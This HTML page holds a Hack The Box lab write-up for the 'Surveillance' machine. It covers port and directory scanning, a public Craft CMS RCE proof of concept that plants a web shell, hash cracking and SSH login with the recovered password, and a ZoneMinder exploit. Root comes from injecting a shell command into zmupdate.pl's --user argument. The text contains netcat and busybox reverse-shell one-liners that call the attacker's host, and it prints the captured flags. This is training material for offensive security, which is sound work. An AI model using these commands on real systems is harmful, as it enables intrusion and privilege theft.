@@ -1,0 +1,630 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="http://time0ut07.github.io/htb/surveillance/">
+      
+      
+      
+      
+      <link rel="icon" href="assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.33">
+    
+    
+      
+        <title>HTB: Surveillance</title>
+      
+    
+    
+      <link rel="stylesheet" href="assets/stylesheets/main.3cba04c6.min.css">
+      
+        
+        <link rel="stylesheet" href="assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#surveillance" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="." title="HTB: Surveillance" class="md-header__button md-logo" aria-label="HTB: Surveillance" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            HTB: Surveillance
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Surveillance
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="." title="HTB: Surveillance" class="md-nav__button md-logo" aria-label="HTB: Surveillance" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    HTB: Surveillance
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Surveillance
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="." class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Surveillance
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#step-1-scanning-and-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Scanning and Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-2-initial-foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Initial Foothold
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-3-initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Initial Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-4-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#step-1-scanning-and-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Scanning and Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-2-initial-foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Initial Foothold
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-3-initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Initial Access
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#step-4-privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 4: Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<h1 id="surveillance">Surveillance</h1>
+<p>Written on: 29/3/2024                                                                                                                time0ut</p>
+<table>
+<thead>
+<tr>
+<th>Difficulty</th>
+<th>Location</th>
+<th>Operating System</th>
+<th>Total number of Tasks</th>
+<th>Day started</th>
+<th>Day completed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Medium</td>
+<td>Machines</td>
+<td>Linux</td>
+<td>2</td>
+<td>6/1/2024</td>
+<td>22/3/2024</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="step-1-scanning-and-enumeration">Step 1: Scanning and Enumeration</h3>
+<p>The first thing we always do when facing a machine is to scan for open ports using <a href="https://www.notion.so/nmap-6b5e6cddfe814c72a32bbda9d876bd91?pvs=21">nmap</a></p>
+<p><code>sudo nmap -sS -sV 192.168.0.1</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled.png" /></p>
+<p>As you can see, port 22 (SSH) and port 80 (HTTP) are both open.</p>
+<p>Let’s check out port 80 first. Just go to any browser</p>
+<p><code>http://192.168.0.1</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%201.png" /></p>
+<p>As you can see, we couldn’t connect to the server. To fix this, we will need to modify our <code>/etc/hosts</code> file</p>
+<p><code>sudo nano /etc/hosts</code></p>
+<p>Add in the last line</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%202.png" /></p>
+<p>Save the file and if you refresh the page again, it should work.</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%203.png" /></p>
+<p>So, before we explore the page, let’s do some subdomain discovery using <a href="https://www.notion.so/gobuster-481db13180574375a7820228a11197b5?pvs=21">gobuster</a></p>
+<p><code>gobuster dns -d surveillance.htb -w /usr/share/wordlists/dirb/common.txt</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%204.png" /></p>
+<p>As you can see, nothing. Now, let’s brute force directories using <a href="https://www.notion.so/gobuster-481db13180574375a7820228a11197b5?pvs=21">gobuster</a> again</p>
+<p><code>gobuster dir -u http://surveillance.htb/ -w /usr/share/wordlists/dirb/common.txt</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%205.png" /></p>
+<p>Finally, some results. Hmm… there seem to be a <code>/admin</code> directory. Let’s check it out!</p>
+<p><code>http://surveillance.htb/admin</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%206.png" /></p>
+<hr />
+<h3 id="step-2-initial-foothold">Step 2: Initial Foothold</h3>
+<p>As you can see, the server is using craft cms. Let’s search online and see if there are any exploits related to it.</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%207.png" /></p>
+<p>Bingo! Multiple PoC on RCE. I will be trying out the PoC on the <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892">second link</a></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%208.png" /></p>
+<p>Woah that was easy… however, the shell is so unstable that if I try to stabilize it, it will hang there.</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%209.png" /></p>
+<p>However, it can still handle some basic command but I can just do it on the web shell.</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2010.png" /></p>
+<p>Looking at the printed text, we can see that a web shell is deployed in the <code>/admin/shell.php?cmd=</code> directory. So… let’s try it out!</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2011.png" /></p>
+<p>Hmm… so what can we do with this? Let’s try to make a reverse shell to connect to our host machine to make our lives easier. </p>
+<p>I am going to use the shell in the command prompt instead of the web shell.</p>
+<p>Firstly, we set up a listener using <a href="https://www.notion.so/netcat-db46e94e76a149cb986349d8d0a4a0f9?pvs=21">netcat</a></p>
+<p><code>nc -nvlp 4444</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2012.png" /></p>
+<p>Next, we put in this command to have a reverse shell</p>
+<p><code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc &lt;host_ip&gt; 4444 &gt;/tmp/f</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2013.png" /></p>
+<p>As you can see, it just hangs there, however, if you look at your netcat listener, you will see that a connection was made</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2014.png" /></p>
+<hr />
+<h3 id="step-3-initial-access">Step 3: Initial Access</h3>
+<p>The first thing I did was to stabilize the shell</p>
+<p><code>python3 -c 'import pty; pty.spawn("/bin/sh")'</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2015.png" /></p>
+<p>Now, let’s do some basic enumeration</p>
+<p><code>pwd</code></p>
+<p><code>whoami</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2016.png" /></p>
+<p>Hmm… nothing useful. How about the users that exists in this machine</p>
+<p><code>ls -la /home</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2017.png" /></p>
+<p>As you can see, there are 2 user, matthew and zoneminder.</p>
+<p>After exploring the machine for some time, I found an interesting file that might be useful located in <code>/var/www/html/craft/storage/backups</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2018.png" /></p>
+<p>Let’s try to get this file out so we can unzip it.</p>
+<p>Firstly, I copy the file in the <code>/storage/backups</code> directory to <code>/web</code> directory. This is because the /web directory is the folder that is public facing.</p>
+<p><code>cp /var/www/html/craft/storage/backups/surveillance--2023-10-17-202801--v4.4.14.sql.zip /var/www/html/craft/web/surveillance--2023-10-17-202801--v4.4.14.sql.zip</code></p>
+<p>After moving it, we can just use the <a href="https://www.notion.so/Surveillance-7976caf6515941a1aca6cc2d83dab2f7?pvs=21">wget</a> command to get the file</p>
+<p><code>wget http://surveillance.htb/surveillance--2023-10-17-202801--v4.4.14.sql.zip</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2019.png" /></p>
+<p>Now we just unzip it</p>
+<p><code>unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2020.png" /></p>
+<p>After reading the file</p>
+<p><code>cat surveillance--2023-10-17-202801--v4.4.14.sql</code></p>
+<p>I found Matthew’s hashed password</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2021.png" /></p>
+<p>Let’s crack it</p>
+<p>First, we put the hash into a file</p>
+<p><code>echo '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec' &gt; hash.txt</code></p>
+<p>Next, we identify the hash using <a href="https://www.notion.so/hash-identifier-ec8daf9220e54f81b0d0f4f2a73a2635?pvs=21">hash-identifier</a></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2022.png" /></p>
+<p>Finally, we use <a href="https://www.notion.so/hashcat-5d33f968aff343bc8f9f78489d3f98cd?pvs=21">hashcat</a> to crack it
+<code>hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2023.png" /></p>
+<p>Here we go! Matthew’s password.</p>
+<p>Now, we can just SSH into the machine using Matthew’s account</p>
+<p><code>Username: matthew</code></p>
+<p><code>Password: starcraft122490</code></p>
+<p><code>ssh matthew@192.168.0.1</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2024.png" /></p>
+<p>And if you look at the Matthew’s home directory, the user flag is there</p>
+<p><code>ls</code> </p>
+<p><code>cat user.txt</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2025.png" /></p>
+<aside>
+💡 Submit User Flag
+
+</aside>
+
+<p><strong>Answer: 00eb42c67f8fc185488719ea964eea14</strong></p>
+<hr />
+<h3 id="step-4-privilege-escalation">Step 4: Privilege Escalation</h3>
+<p>The first thing I always do for privilege escalation is <code>sudo -l</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2026.png" /></p>
+<p>Of course the privilege escalation part wouldn’t be so direct</p>
+<p>The next thing I did was <code>uname -a</code> to check for existing kernel exploit… unfortunately after trying out one PoC, it didn’t work.</p>
+<p>Before I start exploring the machine, I will upload linpeas and run it</p>
+<p><code>http -m http.server 4444</code></p>
+<p><code>wget http://&lt;host_ip&gt;:4444/linpeas.sh</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2027.png" /></p>
+<p>Nice we got it into the victim’s machine. Now let’s run it</p>
+<p><code>chmod +x linpeas.sh</code></p>
+<p><code>./linpeas.sh</code></p>
+<p>Just wait for it to finish running and you can start looking at the ‘report’</p>
+<p>One of the thing that caught my attention was this password (zoneminder’s password) for some software</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2028.png" /></p>
+<p>Another thing that caught my attention is this</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2029.png" /></p>
+<p>It seems to be a database username and password</p>
+<p>Lastly, this caught my attention as well</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2030.png" /></p>
+<p>There seems to be a internal website</p>
+<p>So why not we try to access that internal website</p>
+<p><code>ssh -L 2222:127.0.0.1:8080 matthew@192.168.0.1</code></p>
+<p>This command will establish a SSH tunnel with port forwarding. When this command is run and the user is authenticated on the server, a secure tunnel will be established between your local machine and the remote server. Any traffic sent to your local host port 2222 will be forwarded to port 8080 on the remote server.</p>
+<p>Therefore, if you go to your browser and enter</p>
+<p><code>http://localhost:2222</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2031.png" /></p>
+<p>You will see that we have successfully access an internal website</p>
+<p>The first thing I did was to check for existing exploits</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2032.png" /></p>
+<p>I will be using the <a href="https://github.com/rvizx/CVE-2023-26035">first PoC</a></p>
+<p><code>python3 exploit.py -t http://127.0.0.1:2222 -ip &lt;host_ip&gt; -p 4444</code></p>
+<p>Before we run this command, we need to set up a <a href="https://www.notion.so/netcat-db46e94e76a149cb986349d8d0a4a0f9?pvs=21">netcat</a> listener</p>
+<p><code>nc -nvlp 4444</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2033.png" /></p>
+<p>As you can see, it hangs there. However, if you look at your netcat listener, you will see that we are connected</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2034.png" /></p>
+<p>Again, we first stabilize the shell</p>
+<p><code>python3 -c 'import pty; pty.spawn("/bin/sh")'</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2035.png" /></p>
+<p>Now, some basic enumeration</p>
+<p><code>whoami</code></p>
+<p><code>pwd</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2036.png" /></p>
+<p>Hmm… this time we are login as zoneminder. Let’s look at his home directory first</p>
+<p><code>cd /home/zoneminder; ls</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2037.png" /></p>
+<p>Woah… empty! Let’s try <code>sudo -l</code> again</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2038.png" /></p>
+<p>Bingo! The user zoneminder is able to run all files in <code>/usr/bin</code> that starts with <code>zm</code> and end with <code>.pl</code> without password. Let’s check out the files there.</p>
+<p><code>cd /use/bin; ls -la</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2039.png" /></p>
+<p>… there’s actually a lot of files here bruh. I actually look through all the files to see if there are any way to privilege escalate (yes it took a long time)</p>
+<p>I found out that the <code>zmupdate.pl</code> file is actually vulnerable. If you enter this line of command, you will actually get a root shell (I still haven’t figure it out why and how)</p>
+<p><code>sudo /usr/bin/zmupdate.pl --version=1 --user='$(/bin/bash -i)' --pass=ZoneMinderPassword2023</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2040.png" /></p>
+<p>Now that we are in the root account. However, if you try to run any command, you will realise that the shell is buggy.</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2041.png" /></p>
+<p>So now instead of executing a command in the user parameter, I will execute a file where it is a reverse shell for our host. </p>
+<p>Since we cannot create any file in the current directory, we will need to go to the tmp directory first</p>
+<p><code>cd /tmp</code></p>
+<p>Then, we will create a file and make it an executable</p>
+<p><code>echo '#!/bin/bash\nbusybox nc 10.10.14.85 7777 -e sh' &gt; busy.sh</code></p>
+<p><code>chmod +x busy.sh</code></p>
+<p>Finally, before run the command, we start a <code>netcat</code> listener on our host</p>
+<p><code>nc -nvlp 7777</code></p>
+<p>Now run the command</p>
+<p><code>sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/busy.sh)' --pass=ZoneMinderPassword2023</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2042.png" /></p>
+<p>As you can see, it hangs there. However, if you look at your netcat lisenter, you will see that a connection is made</p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2043.png" /></p>
+<p>And now if you check the user, it should be root</p>
+<p><code>whoami</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2044.png" /></p>
+<p>Bingo! Now all we need to do is to get the root flag</p>
+<p><code>cd /root; cat root.txt</code></p>
+<p><img alt="Untitled" src="Surveillance%207976caf6515941a1aca6cc2d83dab2f7/Untitled%2045.png" /></p>
+<p>Viola! There you have it, the root flag!</p>
+<aside>
+💡 Submit Root Flag
+
+</aside>
+
+<p><strong>Answer: dd48e305d386dcf9cc15c53d668d8829</strong></p>
+<div class="language-text highlight"><span class="filename">Text Only</span><pre><span></span><code>                                                                    ~ End ~
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": ".", "features": ["header.autohide", "navigation.footer", "navigation.path", "content.code.copy"], "search": "assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="assets/javascripts/bundle.af256bd8.min.js"></script>
+      
+    
+  </body>
+</html>
